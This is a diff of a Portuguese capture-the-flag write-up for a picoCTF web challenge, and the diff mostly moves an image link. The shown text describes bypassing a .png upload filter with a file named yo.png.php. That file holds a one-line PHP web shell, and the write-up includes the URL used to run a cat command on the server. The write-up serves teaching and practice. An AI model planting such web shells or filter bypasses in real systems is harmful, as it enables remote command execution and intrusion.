@@ -13,7 +13,9 @@ Detalhes adicionais estarão disponíveis após o lançamento de sua instância 
 
 Abrimos a URL do desafio e identificamos uma funcionalidade de upload que aceita apenas arquivos .png.
 
-Criamos um arquivo yo.php com uma simples payload PHP (<?=\$_GET[0]`?>`).
+![image](https://github.com/user-attachments/assets/5a513762-7cf8-4af4-8382-ff46da02f5dc)
+
+Criamos um arquivo yo.php com uma simples payload PHP `(<?=\$_GET[0]`?>`)`.
 
 Tentamos enviá-lo, mas o servidor rejeitou, indicando que o nome do arquivo precisava conter .png.
 
@@ -42,8 +44,6 @@ Encontramos GQ4DOOBVMMYGK.txt e lemos o conteúdo
 http://atlas.picoctf.net:62573/uploads/yo.png.php?0=cat%20../GQ4DOOBVMMYGK.txt
 
 
-
-![image](https://github.com/user-attachments/assets/5a513762-7cf8-4af4-8382-ff46da02f5dc)
 
 ![image](https://github.com/user-attachments/assets/58157f2b-faf5-4fa4-8736-2362f4d855fd)
 
